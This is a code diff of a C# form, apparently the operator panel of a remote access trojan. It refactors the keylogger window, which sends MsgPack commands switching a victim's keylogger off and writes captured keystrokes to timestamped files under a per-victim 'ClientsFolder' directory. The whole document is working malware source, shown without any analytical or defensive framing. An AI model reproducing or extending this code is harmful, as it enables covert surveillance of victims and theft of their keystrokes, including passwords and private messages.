@@ -1,5 +1,5 @@
 ﻿using Server.MessagePack;
-using Server.Sockets;
+using Server.Connection;
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -22,21 +22,25 @@ namespace Server.Forms
         }
 
         public Form1 F { get; set; }
-        internal Clients C { get; set; }
-        public StringBuilder SB = new StringBuilder();
+        internal Clients Client { get; set; }
+        public StringBuilder Sb = new StringBuilder();
 
         private void Timer1_Tick(object sender, EventArgs e)
         {
-            if (!C.ClientSocket.Connected) this.Close();
+            try
+            {
+                if (!Client.TcpClient.Connected) this.Close();
+            }
+            catch { this.Close(); }
         }
 
         private void Keylogger_FormClosed(object sender, FormClosedEventArgs e)
         {
-            SB?.Clear();
+            Sb?.Clear();
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "keyLogger";
             msgpack.ForcePathObject("isON").AsString = "false";
-            ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
         }
 
         private void ToolStripTextBox1_KeyDown(object sender, KeyEventArgs e)
@@ -67,7 +71,7 @@ namespace Server.Forms
         {
             try
             {
-                string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + C.ID + "\\Keylogger");
+                string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + Client.ID + "\\Keylogger");
                 if (!Directory.Exists(fullPath))
                     Directory.CreateDirectory(fullPath);
                 File.WriteAllText(fullPath + $"\\Keylogger_{DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss")}.txt", richTextBox1.Text.Replace("\n", Environment.NewLine));
